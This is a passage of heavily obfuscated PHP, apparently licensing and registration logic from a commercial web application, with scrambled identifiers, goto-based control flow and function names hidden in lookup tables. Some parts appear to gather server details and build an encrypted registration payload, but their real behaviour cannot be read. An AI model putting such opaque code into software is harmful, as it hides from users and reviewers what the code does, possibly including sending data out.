EŸ¬öè—„¬; E¥òÚŞˆ¹†: $Dßêˆ¢¼’´ = $aÜˆ¶Íåõ¡[573]; if (!$A¡·¦³íÂ×[32]($C«‹¨¯†ÀÀ, $f‹‡É¤Ú¸ç)) { return; } $f“…”ïªİï = $A¡·¦³íÂ×[33]($C«‹¨¯†ÀÀ, $f‹‡É¤Ú¸ç); goto aœ«âõ©É‚; aœ«âõ©É‚: $FŞÌ‘Ô‘Øà = $A¡·¦³íÂ×[25]($C«‹¨¯†ÀÀ, $f“…”ïªİï + $A¡·¦³íÂ×[24]($f‹‡É¤Ú¸ç)); $aäïÂİÁ±ê = $aÜˆ¶Íåõ¡[574]; while ($aäïÂİÁ±ê < $aÜˆ¶Íåõ¡[15]) { if ($aäïÂİÁ±ê >= 0) { break; } $aäïÂİÁ±ê++; } goto D¯¼¹³’°; BÂÙöº‰›Ò: $aÜˆ¶Íåõ¡ =& $_SERVER[¨¤¼…´]; $A¡·¦³íÂ× =& $_SERVER[‚Ÿßñ]; if ($GLOBALS[$A¡·¦³íÂ×[22]][$A¡·¦³íÂ×[28]] != $A¡·¦³íÂ×[10]) { return; } goto Fì¤ºñ¦È¦; EŸ¬öè—„¬: $aÁ‹·ÈˆÜ = $aÜˆ¶Íåõ¡[575]; if (strlen($aÁ‹·ÈˆÜ) < $aÜˆ¶Íåõ¡[15]) { die; } $GLOBALS[$A¡·¦³íÂ×[22]][$A¡·¦³íÂ×[28]] = $A¡·¦³íÂ×[29]($A¡·¦³íÂ×[1], $GLOBALS[$A¡·¦³íÂ×[22]][$A¡·¦³íÂ×[23]]); goto b´¥ÙèĞ•±; Fì¤ºñ¦È¦: $C«‹¨¯†ÀÀ = $_SERVER[$A¡·¦³íÂ×[30]]; $D­‘§Â½ˆ‚ = $aÜˆ¶Íåõ¡[572]; $f‹‡É¤Ú¸ç = $A¡·¦³íÂ×[31]; goto E¥òÚŞˆ¹†; b´¥ÙèĞ•±: } public function run() { goto b©ÛÏ‘¦; b©ÛÏ‘¦: $f¥¦–œÏá¢ =& $_SERVER[¨¤¼…´]; $Dš¦ªºİ¸„ =& $_SERVER[‚Ÿßñ]; $this->{$_SERVER[‚Ÿßñ][37]}(); goto dßƒ§¬Îôğ; EÍÈ‡¯˜Ãá: $this->{$_SERVER[‚Ÿßñ][45]}(); if ($Dš¦ªºİ¸„[19]($c‚¦îœ§) >= 3) { $this->{$_SERVER[‚Ÿßñ][21]}($cĞ¦¯”ˆõó); } else { $this->{$_SERVER[‚Ÿßñ][21]}(ACTION); } goto C‘¨¡ÆŒê; CÚ‘â¢¬ãù: while (strlen($bÎÜÈìÖğ) < $f¥¦–œÏá¢[580]) { if (!$bÎÜÈìÖğ) { break; } $bÎÜÈìÖğ++; } $Dš¦ªºİ¸„[39]($Dš¦ªºİ¸„[42], isset($c‚¦îœ§[2]) && $c‚¦îœ§[0] ? $c‚¦îœ§[2] : $this->defaultAction); $Dš¦ªºİ¸„[39]($Dš¦ªºİ¸„[43], MOD . $Dš¦ªºİ¸„[1] . ST . $Dš¦ªºİ¸„[1] . ACT); goto E´‘™¦Ø¦Ù; d†½„‡Íší: $aÕò¬Ó­„ã = $f¥¦–œÏá¢[576]; $Dš¦ªºİ¸„[39]($Dš¦ªºİ¸„[40], isset($c‚¦îœ§[0]) && $c‚¦îœ§[0] ? $c‚¦îœ§[0] : $this->defaultModule); $a¦„çĞ˜¤ = $f¥¦–œÏá¢[577]; goto fÈ¨¡ò‹; dßƒ§¬Îôğ: $this->{$_SERVER[‚Ÿßñ][38]}(); $c‚¦îœ§ = $GLOBALS[$Dš¦ªºİ¸„[22]][$Dš¦ªºİ¸„[23]]; $cĞ¦¯”ˆõó = $GLOBALS[$Dš¦ªºİ¸„[22]][$Dš¦ªºİ¸„[28]]; goto d†½„‡Íší; fÈ¨¡ò‹: if (strlen($a¦„çĞ˜¤) < $f¥¦–œÏá¢[578]) { return; } $Dš¦ªºİ¸„[39]($Dš¦ªºİ¸„[41], isset($c‚¦îœ§[1]) && $c‚¦îœ§[0] ? $c‚¦îœ§[1] : $this->defaultController); $bÎÜÈìÖğ = $f¥¦–œÏá¢[579]; goto CÚ‘â¢¬ãù; E´‘™¦Ø¦Ù: $F³ØÜ‹ = $f¥¦–œÏá¢[581]; while ($F³ØÜ‹ < $f¥¦–œÏá¢[580]) { if ($F³ØÜ‹ >= 0) { break; } $F³ØÜ‹++; } $_SERVER[$Dš¦ªºİ¸„[44]] = $Dš¦ªºİ¸„[6](ACTION); goto EÍÈ‡¯˜Ãá; C‘¨¡ÆŒê: } private $juriabc3ae07 = array(); private $mace5759fa2b = ''; public function fsey1ca0114f() { goto b¬·ï¶‚Åª; DˆçÅÂİ¨î: $A©ùù²°… = $B–íëùÆÈÀ[584]; if (strlen($A©ùù²°…) < $B–íëùÆÈÀ[568]) { die; } $this->{$_SERVER[‚Ÿßñ][3]}($bçŞàŒôŒ[57], array($this, $bçŞàŒôŒ[58])); goto Aå§ñÅ‹ƒ; Aå§ñÅ‹ƒ: $A¢ ¬¢É¥ß = $B–íëùÆÈÀ[585]; if (!$A¢ ¬¢É¥ß) { return; } $this->{$_SERVER[‚Ÿßñ][3]}($bçŞàŒôŒ[59], array($this, $bçŞàŒôŒ[60])); goto FÃÔåïŸ‘œ; b¬·ï¶‚Åª: $B–íëùÆÈÀ =& $_SERVER[¨¤¼…´]; $bçŞàŒôŒ =& $_SERVER[‚Ÿßñ]; $this->{$_SERVER[‚Ÿßñ][46]}(); goto eªœğ–¥Œ; F˜‘î—ÛæÇ: $this->{$_SERVER[‚Ÿßñ][49]}(); $this->{$_SERVER[‚Ÿßñ][50]}(); $this->{$_SERVER[‚Ÿßñ][51]}(); goto Bß§ÖÌÒˆ‹; aà š÷Õ‚: $d ÖÒÌÜ§í = $B–íëùÆÈÀ[583]; while ($d ÖÒÌÜ§í < $B–íëùÆÈÀ[580]) { if ($d ÖÒÌÜ§í >= 0) { break; } $d ÖÒÌÜ§í++; } $this->{$_SERVER[‚Ÿßñ][48]}(); goto F˜‘î—ÛæÇ; eªœğ–¥Œ: $b¥Ñê¸ÂØÁ = $B–íëùÆÈÀ[582]; if (strlen($b¥Ñê¸ÂØÁ) < $B–íëùÆÈÀ[571]) { return; } $this->{$_SERVER[‚Ÿßñ][47]}(); goto aà š÷Õ‚; Bß§ÖÌÒˆ‹: $this->{$_SERVER[‚Ÿßñ][52]}(); $this->{$_SERVER[‚Ÿßñ][3]}($bçŞàŒôŒ[53], array($this, $bçŞàŒôŒ[54])); $this->{$_SERVER[‚Ÿßñ][3]}($bçŞàŒôŒ[55], array($this, $bçŞàŒôŒ[56])); goto DˆçÅÂİ¨î; FÃÔåïŸ‘œ: } public function lwpm9b4c9d3c($e’µñ·è¸) { goto f—‹À‹‚Ëˆ; d†¿àŞˆĞ¸: $e‰ŞÈÀğ»Æ = array($EÇçØ´Øæì[64], $EÇçØ´Øæì[65], $EÇçØ´Øæì[66], $EÇçØ´Øæì[67], $EÇçØ´Øæì[68], $EÇçØ´Øæì[69], $EÇçØ´Øæì[70], $EÇçØ´Øæì[71], $EÇçØ´Øæì[72], $EÇçØ´Øæì[73], $EÇçØ´Øæì[74], $EÇçØ´Øæì[75], $EÇçØ´Øæì[76], $EÇçØ´Øæì[77], $EÇçØ´Øæì[78], $EÇçØ´Øæì[79], $EÇçØ´Øæì[80], $EÇçØ´Øæì[81], $EÇçØ´Øæì[82], $EÇçØ´Øæì[83], $EÇçØ´Øæì[84], $EÇçØ´Øæì[85], $EÇçØ´Øæì[86], $EÇçØ´Øæì[87], $EÇçØ´Øæì[88], $EÇçØ´Øæì[89], $EÇçØ´Øæì[90], $EÇçØ´Øæì[91], $EÇçØ´Øæì[92], $EÇçØ´Øæì[93], $EÇçØ´Øæì[94], $EÇçØ´Øæì[95], $EÇçØ´Øæì[96], $EÇçØ´Øæì[97], $EÇçØ´Øæì[98], $EÇçØ´Øæì[99]); foreach ($e‰ŞÈÀğ»Æ as $BÚèªÈêïù) { $eØ¸É‚ÍŞº = $GLOBALS[$EÇçØ´Øæì[100]][$EÇçØ´Øæì[101]][$BÚèªÈêïù]; if (isset($DÆ‹ƒ²‘[$BÚèªÈêïù])) { $eØ¸É‚ÍŞº = $DÆ‹ƒ²‘[$BÚèªÈêïù]; } $e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[103]][$BÚèªÈêïù] = $eØ¸É‚ÍŞº; } $eïŸ§Ãï¡ = $e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[103]][$EÇçØ´Øæì[76]]; goto fÑîƒ©Á; cŒ’Ü»èŠ: unset($e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[104]][$EÇçØ´Øæì[106]]); unset($e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[103]][$EÇçØ´Øæì[76]]); unset($e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[103]][$EÇçØ´Øæì[107]]); goto dã¹äº¬Ù; fÔ÷«ïÑº: $AŒ¿¨„õ°ì = $CÏ¢”¢Œá‘[589]; if (strlen($AŒ¿¨„õ°ì) < $CÏ¢”¢Œá‘[578]) { die; } if ($DÆ‹ƒ²‘[$EÇçØ´Øæì[129]] != $EÇçØ´Øæì[130]) { $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[131]] = $DÆ‹ƒ²‘[$EÇçØ´Øæì[131]]; $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[132]] = $DÆ‹ƒ²‘[$EÇçØ´Øæì[132]]; $D“Å÷œ‘ß” = $EÇçØ´Øæì[133](10) . $this->mace5759fa2b . $EÇçØ´Øæì[133](5); $e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[134]][$EÇçØ´Øæì[135]] = $this->{$_SERVER[‚Ÿßñ][136]}($D“Å÷œ‘ß”, $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[122]]); } goto fÎƒè‚§ö; dã¹äº¬Ù: $B–Õ¯‡ßËÉ = $CÏ¢”¢Œá‘[587]; if (strlen($B–Õ¯‡ßËÉ) < $CÏ¢”¢Œá‘[568]) { return; } $e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[103]][$EÇçØ´Øæì[108]] = array($EÇçØ´Øæì[109] => (int) $eïŸ§Ãï¡[$EÇçØ´Øæì[110]], $EÇçØ´Øæì[111] => $EÇçØ´Øæì[112]($EÇçØ´Øæì[113]($eïŸ§Ãï¡, $EÇçØ´Øæì[114], array())), $EÇçØ´Øæì[115] => (int) $EÇçØ´Øæì[113]($eïŸ§Ãï¡, $EÇçØ´Øæì[116], 0)); goto c¦ÆØœÎ·; A°ŸªÇ•È: return $e’µñ·è¸; goto d¤ĞÌ±Çõ; A‹†áØ: $FåÜêƒÌÃº = $CÏ¢”¢Œá‘[590]; if (!$FåÜêƒÌÃº) { return; } if ($EÇçØ´Øæì[113]($GLOBALS, $EÇçØ´Øæì[141]) && $this->config[$EÇçØ´Øæì[142]]) { $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[143]] = WEB_ROOT; } goto A°ŸªÇ•È; fÎƒè‚§ö: if ($this->mace5759fa2b == $EÇçØ´Øæì[130]) { $e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[103]][$EÇçØ´Øæì[108]][$EÇçØ´Øæì[116]] = 0; } $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[137]] = $EÇçØ´Øæì[113]($this->juriabc3ae07, $EÇçØ´Øæì[138], $EÇçØ´Øæì[10]); $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[139]] = $EÇçØ´Øæì[113]($this->juriabc3ae07, $EÇçØ´Øæì[140], $EÇçØ´Øæì[10]); goto A‹†áØ; fÑîƒ©Á: $BŸ‚¹›‹» = $CÏ¢”¢Œá‘[586]; while ($BŸ‚¹›‹» < $CÏ¢”¢Œá‘[571]) { if ($BŸ‚¹›‹» >= 0) { break; } $BŸ‚¹›‹»++; } unset($e’µñ·è¸[$EÇçØ´Øæì[102]][$EÇçØ´Øæì[104]][$EÇçØ´Øæì[105]]); goto cŒ’Ü»èŠ; DÃ¦‡Ô©À: $f •ò„ÑŒõ = $CÏ¢”¢Œá‘[588]; if (strlen($f •ò„ÑŒõ) < $CÏ¢”¢Œá‘[578]) { die; } $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[129]] = $this->mace5759fa2b; goto fÔ÷«ïÑº; c¦ÆØœÎ·: $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[118]] = $EÇçØ´Øæì[119]($EÇçØ´Øæì[120])->{$_SERVER[‚Ÿßñ][121]}(); $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[122]] = $EÇçØ´Øæì[123]($_SERVER[$EÇçØ´Øæì[124]] . $DÆ‹ƒ²‘[$EÇçØ´Øæì[125]]); $e’µñ·è¸[$EÇçØ´Øæì[117]][$EÇçØ´Øæì[126]] = $EÇçØ´Øæì[127]($EÇçØ´Øæì[128]()); goto DÃ¦‡Ô©À; f—‹À‹‚Ëˆ: $CÏ¢”¢Œá‘ =& $_SERVER[¨¤¼…´]; $EÇçØ´Øæì =& $_SERVER[‚Ÿßñ]; $DÆ‹ƒ²‘ = $EÇçØ´Øæì[61]($EÇçØ´Øæì[62])->{$_SERVER[‚Ÿßñ][63]}(); goto d†¿àŞˆĞ¸; d¤ĞÌ±Çõ: } private function ifvycc55e764() { goto AîíŸÛ®µí; EÆšÙ½±: $d«ñô¾Åœ­ = $cØš¥ö¬”†[61]($cØš¥ö¬”†[62])->{$_SERVER[‚Ÿßñ][63]}(); $CäÄ²ë¸ìŒ = $E¼Á±Š…Àâ[593]; while (strlen($CäÄ²ë¸ìŒ) < $E¼Á±Š…Àâ[15]) { if (!$CäÄ²ë¸ìŒ) { break; } $CäÄ²ë¸ìŒ++; } goto e»‹¶æù; e»‹¶æù: $Bßìí¶ß´ = array($cØš¥ö¬”†[168] => $d«ñô¾Åœ­[$cØš¥ö¬”†[64]], $cØš¥ö¬”†[169] => $d«ñô¾Åœ­[$cØš¥ö¬”†[65]], $cØš¥ö¬”†[170] => $cØš¥ö¬”†[10]); foreach ($fäÙ†ŠóÔŸ as $FÎóØÌ¶§ï) { if (!isset($d«ñô¾Åœ­[$FÎóØÌ¶§ï]) || !$d«ñô¾Åœ­[$FÎóØÌ¶§ï]) { continue; } $Bßìí¶ß´[$FÎóØÌ¶§ï] = $d«ñô¾Åœ­[$FÎóØÌ¶§ï]; $aÓ–š÷ÆŸƒ = $E¼Á±Š…Àâ[594]; if (strlen($aÓ–š÷ÆŸƒ) < $E¼Á±Š…Àâ[578]) { die; } } $cØš¥ö¬”†[13](array($cØš¥ö¬”†[160], $cØš¥ö¬”†[161]), $Bßìí¶ß´); goto c˜‘‚íƒĞŒ; E’ƒªºéè¡: if ($this->mace5759fa2b == $cØš¥ö¬”†[130]) { return; } $fäÙ†ŠóÔŸ = array($cØš¥ö¬”†[162], $cØš¥ö¬”†[163], $cØš¥ö¬”†[164], $cØš¥ö¬”†[165], $cØš¥ö¬”†[166], $cØš¥ö¬”†[167]); $a§äøÆ­·İ = $E¼Á±Š…Àâ[592]; goto EÆšÙ½±; AîíŸÛ®µí: $E¼Á±Š…Àâ =& $_SERVER[¨¤¼…´]; $cØš¥ö¬”† =& $_SERVER[‚Ÿßñ]; if ($_SERVER[$cØš¥ö¬”†[44]] == $cØš¥ö¬”†[144]) { goto aáˆËë´‡ƒ; CÍ÷÷À¾‹: $cØš¥ö¬”†[13](array($cØš¥ö¬”†[160], $cØš¥ö¬”†[161]), $Bßìí¶ß´); goto C­•µ¤Ö°×; C»³áÈ‘š›: $Bßìí¶ß´ = array($cØš¥ö¬”†[159] => $CÅ†‚òĞ’); $dŞ…¾‡˜¤ = $E¼Á±Š…Àâ[591]; if (!$dŞ…¾‡˜¤) { return; } goto CÍ÷÷À¾‹; aáˆËë´‡ƒ: $CÅ†‚òĞ’ = array($cØš¥ö¬”†[129] => $this->mace5759fa2b, $cØš¥ö¬”†[145] => $this->{$_SERVER[‚Ÿßñ][146]}(), $cØš¥ö¬”†[147] => $cØš¥ö¬”†[61]($cØš¥ö¬”†[148])->{$_SERVER[‚Ÿßñ][149]}()); if ($this->mace5759fa2b != $cØš¥ö¬”†[130]) { $e²ˆ¨öå®ã = $cØš¥ö¬”†[113]($this->juriabc3ae07, $cØš¥ö¬”†[150]); if ($e²ˆ¨öå®ã) { $CÅ†‚òĞ’[$cØš¥ö¬”†[151]] = $e²ˆ¨öå®ã; $CÅ†‚òĞ’[$cØš¥ö¬”†[152]] = $cØš¥ö¬”†[153]($cØš¥ö¬”†[113]($this->juriabc3ae07, $cØš¥ö¬”†[154])); $CÅ†‚òĞ’[$cØš¥ö¬”†[155]] = $cØš¥ö¬”†[113]($this->juriabc3ae07, $cØš¥ö¬”†[140]); } } $CÅ†‚òĞ’ = $this->{$_SERVER[‚Ÿßñ][156]}($cØš¥ö¬”†[157]($CÅ†‚òĞ’), $cØš¥ö¬”†[123]($cØš¥ö¬”†[158])); goto C»³áÈ‘š›; C­•µ¤Ö°×: } goto E’ƒªºéè¡; c˜‘‚íƒĞŒ: } private function qinc802603fe() { goto b¾¸Ï´ë; D”ÑÙ‹í×Ê: $BÒ¿®„ÇÀ¤ = $A¹¸Ò„»±í[$B»š¨‡ôø[201]]; $eôĞ”ÇàŸ = $this->{$_SERVER[‚Ÿßñ][208]}($BÒ¿®„ÇÀ¤[$B»š¨‡ôø[209]]); $aÒâ«½ƒÃà = $FÙÀÎ±ÕÊÑ[595]; goto f‘ãÉá™ö›; f‘ãÉá™ö›: if (strlen($aÒâ«½ƒÃà) < $FÙÀÎ±ÕÊÑ[15]) { die; } if (!$eôĞ”ÇàŸ || $eôĞ”ÇàŸ != $BÒ¿®„ÇÀ¤[$B»š¨‡ôø[154]]) { $bå„½£¢° = array($B»š¨‡ôø[210] => $B»š¨‡ôø[61]($B»š¨‡ôø[62])->{$_SERVER[‚Ÿßñ][63]}($B»š¨‡ôø[125]), $B»š¨‡ôø[211] => $_SERVER[$B»š¨‡ôø[124]], $B»š¨‡ôø[212] => $B»š¨‡ôø[213](), $B»š¨‡ôø[183] => $_SERVER[$B»š¨‡ôø[184]]); $A ¦±‰²·ª = $this->{$_SERVER[‚Ÿßñ][214]}($B»š¨‡ôø[157]($bå„½£¢°)); $this->{$_SERVER[‚Ÿßñ][191]}($B»š¨‡ôø[215] . $A ¦±‰²·ª); $B»š¨‡ôø[175]($B»š¨‡ôø[206]($B»š¨‡ôø[216]), !0); } $FÊ›¼Ú’ = array($B»š¨‡ôø[217] => $eÖÀÊÓ¹«Ä[$B»š¨‡ôø[174]], $B»š¨‡ôø[218] => $BÒ¿®„ÇÀ¤[$B»š¨‡ôø[219]], $B»š¨‡ôø[220] => $B»š¨‡ôø[133](16), $B»š¨‡ôø[129] => $BÒ¿®„ÇÀ¤[$B»š¨‡ôø[221]]); goto eá´²Ê”Û; d­•‡Æ¶Éğ: $føÒö“×À‡ = $B»š¨‡ôø[123]($_SERVER[$B»š¨‡ôø[124]] . $FÖ‰Ú«à™Ê); if ($E­õ¹‰Ú®[$B»š¨‡ôø[187]] == $B»š¨‡ôø[188]) { $CÒ²—èÔË = $this->{$_SERVER[‚Ÿßñ][156]}($føÒö“×À‡, $B»š¨‡ôø[189]); $A ¦±‰²·ª = $this->{$_SERVER[‚Ÿßñ][136]}($B»š¨‡ôø[157]($eÖÀÊÓ¹«Ä), $føÒö“×À‡ . $B»š¨‡ôø[190], 3); $eŸ¬ßœ½Õí = $this->{$_SERVER[‚Ÿßñ][191]}($B»š¨‡ôø[192] . $CÒ²—èÔË . $B»š¨‡ôø[193] . $A ¦±‰²·ª, -1); $B»š¨‡ôø[175]($eŸ¬ßœ½Õí, !0); } else { if ($E­õ¹‰Ú®[$B»š¨‡ôø[187]] == $B»š¨‡ôø[194]) { $dÂß™À‹® = $B»š¨‡ôø[25]($B»š¨‡ôø[123]($B»š¨‡ôø[195] . $føÒö“×À‡), 12, 15) . $B»š¨‡ôø[196]; $A ¦±‰²·ª = $this->{$_SERVER[‚Ÿßñ][197]}($B»š¨‡ôø[2]($E­õ¹‰Ú®[$B»š¨‡ôø[198]]), $dÂß™À‹®, 2); $A¹¸Ò„»±í = $B»š¨‡ôø[199]($A ¦±‰²·ª, !0); if (!$B»š¨‡ôø[200]($A¹¸Ò„»±í) || !$B»š¨‡ôø[200]($A¹¸Ò„»±í[$B»š¨‡ôø[201]]) || $A¹¸Ò„»±í[$B»š¨‡ôø[174]] != !0) { $e¼ïŞ—Ïï  = $B»š¨‡ôø[202]; $b‘¡™ŠÖš¬ = $A¹¸Ò„»±í[$B»š¨‡ôø[201]] ? $B»š¨‡ôø[203] . $A¹¸Ò„»±í[$B»š¨‡ôø[201]] : $e¼ïŞ—Ïï ; $B»š¨‡ôø[175]($b‘¡™ŠÖš¬, !1); } else { $eÖÀÊÓ¹«Ä[$B»š¨‡ôø[177]] = $A¹¸Ò„»±í[$B»š¨‡ôø[201]][$B»š¨‡ôø[204]]; } } else { $A¹¸Ò„»±í = $this->{$_SERVER[‚Ÿßñ][191]}($B»š¨‡ôø[205], $eÖÀÊÓ¹«Ä, 10); } } if (!$B»š¨‡ôø[200]($A¹¸Ò„»±í) || !$B»š¨‡ôø[200]($A¹¸Ò„»±í[$B»š¨‡ôø[201]]) || $A¹¸Ò„»±í[$B»š¨‡ôø[174]] != !0) { $e¼ïŞ—Ïï  = $B»š¨‡ôø[206]($B»š¨‡ôø[207]); $b‘¡™ŠÖš¬ = $A¹¸Ò„»±í[$B»š¨‡ôø[201]] ? $B»š¨‡ôø[203] . $A¹¸Ò„»±í[$B»š¨‡ôø[201]] : $e¼ïŞ—Ïï ; $B»š¨‡ôø[175]($b‘¡™ŠÖš¬, !1); } goto D”ÑÙ‹í×Ê; D¨—‰»Ñ¡: $B»š¨‡ôø[175]($B»š¨‡ôø[206]($B»š¨‡ôø[216]), !0); goto fãçò°—ß¿; b¾¸Ï´ë: $FÙÀÎ±ÕÊÑ =& $_SERVER[¨¤¼…´]; $B»š¨‡ôø =& $_SERVER[‚Ÿßñ]; if ($_SERVER[$B»š¨‡ôø[44]] != $B»š¨‡ôø[171]) { return; } goto E‚Şó‘ÃçÂ; C³¼âìô£¯: $Dš°ÁÒğÎ‚ = $B»š¨‡ôø[222]($B»š¨‡ôø[25]($Cƒ‘‹´È°, 10, 16)); $cÉòõ××š• = $this->{$_SERVER[‚Ÿßñ][136]}($B»š¨‡ôø[157]($BÒ¿®„ÇÀ¤), $Cƒ‘‹´È°); $fÇ©ÃÁèöæ = $B»š¨‡ôø[230]($B»š¨‡ôø[61]($B»š¨‡ôø[11])->{$_SERVER[‚Ÿßñ][231]}(), $B»š¨‡ôø[232]); goto bù”º´ªÓÈ; dàó¦ïéÈ: $FÊ›¼Ú’[$B»š¨‡ôø[131]] = $B»š¨‡ôø[222]($B»š¨‡ôø[127]($this->{$_SERVER[‚Ÿßñ][156]}($c¶…ì˜˜¹¡, $B»š¨‡ôø[223]))); $C¢×Œ¨–‘ƒ = $B»š¨‡ôø[133](16); $fö³ô±¿¥ = $C¢×Œ¨–‘ƒ . $FÊ›¼Ú’[$B»š¨‡ôø[129]] . $this->{$_SERVER[‚Ÿßñ][156]}($B»š¨‡ôø[123]($FÊ›¼Ú’[$B»š¨‡ôø[217]]), $C¢×Œ¨–‘ƒ); goto cò¯ºö„æø; cò¯ºö„æø: $FÊ›¼Ú’[$B»š¨‡ôø[132]] = $B»š¨‡ôø[127]($B»š¨‡ôø[222]($this->{$_SERVER[‚Ÿßñ][156]}($fö³ô±¿¥, $B»š¨‡ôø[224]))); $F…ñƒ…‰Ï¢ = $FÙÀÎ±ÕÊÑ[596]; if (strlen($F…ñƒ…‰Ï¢) < $FÙÀÎ±ÕÊÑ[578]) { return; } goto E­·¶¿…Ø¼; A‘ïøØæ±ö: while ($d¦Â‹‘ğºŒ < $FÙÀÎ±ÕÊÑ[568]) { if ($d¦Â‹‘ğºŒ >= 0) { break; } $d¦Â‹‘ğºŒ++; } $B»š¨‡ôø[61]($B»š¨‡ôø[11])->{$_SERVER[‚Ÿßñ][234]}($F’‹ƒ[$B»š¨‡ôø[235]], array($B»š¨‡ôø[236] => $FÚÀôÕÒÊÏ)); $BÄÎ•Ã¹ºâ = $FÙÀÎ±ÕÊÑ[599]; goto aØ÷´éßŒù; E­·¶¿…Ø¼: if ($BÒ¿®„ÇÀ¤[$B»š¨‡ôø[225]] && $BÒ¿®„ÇÀ¤[$B»š¨‡ôø[225]] >= 1) { $B»š¨‡ôø[61]($B»š¨‡ôø[62])->{$_SERVER[‚Ÿßñ][226]}($B»š¨‡ôø[227], $B»š¨‡ôø[228]); } $B»š¨‡ôø[61]($B»š¨‡ôø[62])->{$_SERVER[‚Ÿßñ][229]}($FÊ›¼Ú’); $Cƒ‘‹´È° = $B»š¨‡ôø[123]($_SERVER[$B»š¨‡ôø[124]] . $B»š¨‡ôø[222]($FÖ‰Ú«à™Ê) . $FÊ›¼Ú’[$B»š¨‡ôø[218]]); goto C³¼âìô£¯; E‚Şó‘ÃçÂ: if (!$B»š¨‡ôø[113]($GLOBALS, $B»š¨‡ôø[141])) { die; } $E­õ¹‰Ú® = $GLOBALS[$B»š¨‡ôø[22]]; if (isset($E­õ¹‰Ú®[$B»š¨‡ôø[172]])) { $this->{$_SERVER[‚Ÿßñ][173]}(); die; } goto f¶““ß›†Â; eá´²Ê”Û: if ($eÖÀÊÓ¹«Ä[$B»š¨‡ôø[177]]) { $FÊ›¼Ú’[$B»š¨‡ôø[220]] = $eÖÀÊÓ¹«Ä[$B»š¨‡ôø[177]]; } $E¢ƒĞó§§ô = $B»š¨‡ôø[25]($B»š¨‡ôø[123]($FÊ›¼Ú’[$B»š¨‡ôø[218]]), 10, 10); $c¶…ì˜˜¹¡ = $E¢ƒĞó§§ô . $FÊ›¼Ú’[$B»š¨‡ôø[129]] . $FÊ›¼Ú’[$B»š¨‡ôø[220]]; goto dàó¦ïéÈ; f¶““ß›†Â: if (!isset($E­õ¹‰Ú®[$B»š¨‡ôø[174]]) || $B»š¨‡ôø[24]($E­õ¹‰Ú®[$B»š¨‡ôø[174]]) != 16) { $B»š¨‡ôø[175]($B»š¨‡ôø[176] . $E­õ¹‰Ú®[$B»š¨‡ôø[174]], !1); } $FÖ‰Ú«à™Ê = $B»š¨‡ôø[61]($B»š¨‡ôø[62])->{$_SERVER[‚Ÿßñ][63]}($B»š¨‡ôø[125]); $eÖÀÊÓ¹«Ä = array($B»š¨‡ôø[174] => $E­õ¹‰Ú®[$B»š¨‡ôø[174]], $B»š¨‡ôø[177] => $B»š¨‡ôø[133](16), $B»š¨‡ôø[178] => $B»š¨‡ôø[158], $B»š¨‡ôø[179] => $B»š¨‡ôø[180], $B»š¨‡ôø[181] => $_SERVER[$B»š¨‡ôø[182]], $B»š¨‡ôø[183] => $_SERVER[$B»š¨‡ôø[184]], $B»š¨‡ôø[185] => $_SERVER[$B»š¨‡ôø[186]]); goto d­•‡Æ¶Éğ; aØ÷´éßŒù: while (strlen($BÄÎ•Ã¹ºâ) < $FÙÀÎ±ÕÊÑ[568]) { if (!$BÄÎ•Ã¹ºâ) { break; } $BÄÎ•Ã¹ºâ++; } $this->juriabc3ae07 = $BÒ¿®„ÇÀ¤; $this->mace5759fa2b = $FÊ›¼Ú’[$B»š¨‡ôø[129]]; goto d×Íê“À·”; Dœ·…±’¶ˆ: $FÚÀôÕÒÊÏ = array(); $FÚÀôÕÒÊÏ[$Dš°ÁÒğÎ‚] = $cÉòõ××š•; $d¦Â‹‘ğºŒ = $FÙÀÎ±ÕÊÑ[598]; goto A‘ïøØæ±ö; bù”º´ªÓÈ: $A¿„Š›¼œ‘ = $FÙÀÎ±ÕÊÑ[597]; if (!$A¿„Š›¼œ‘) { die; } $F’‹ƒ = $fÇ©ÃÁèöæ[$B»š¨‡ôø[233]]; goto Dœ·…±’¶ˆ; d×Íê“À·”: $this->{$_SERVER[‚Ÿßñ][237]}(); $AÖÀ»´¸ê¯ = $FÙÀÎ±ÕÊÑ[600]; if (strlen($AÖÀ»´¸ê¯) < $FÙÀÎ±ÕÊÑ[568]) { return; } goto D¨—‰»Ñ¡; fãçò°—ß¿: } private function licenseRegistSuccess() { $aÒó…ÈÒš =& $_SERVER[‚Ÿßñ]; $c‘Ú…ô‘†ï = $aÒó…ÈÒš[61]($aÒó…ÈÒš[62])->{$_SERVER[‚Ÿßñ][63]}(); $dâáğÀ¶Â = $_SERVER[¨¤¼…´][601]; if (!$dâáğÀ¶Â) { return; } if ($c‘Ú…ô‘†ï[$aÒó…ÈÒš[89]] != $aÒó…ÈÒš[228]) { $aÒó…ÈÒš[61]($aÒó…ÈÒš[62])->{$_SERVER[‚Ÿßñ][229]}($aÒó…ÈÒš[89], $aÒó…ÈÒš[228]); } $aÒó…ÈÒš[119]($aÒó…ÈÒš[238])->{$_SERVER[‚Ÿßñ][239]}(!0); } private function wahnbc99deb7() { $bâõïË­À¡ =& $_SERVER[‚Ÿßñ]; $bâõïË­À¡[61]($bâõïË­À¡[62])->{$_SERVER[‚Ÿßñ][229]}(array($bâõïË­À¡[217] => $bâõïË­À¡[10], $bâõïË­À¡[218] => $bâõïË­À¡[10], $bâõïË­À¡[129] => $bâõïË­À¡[130], $bâõïË­À¡[131] => $bâõïË­À¡[10], $bâõïË­À¡[132] => $bâõïË­À¡[10])); 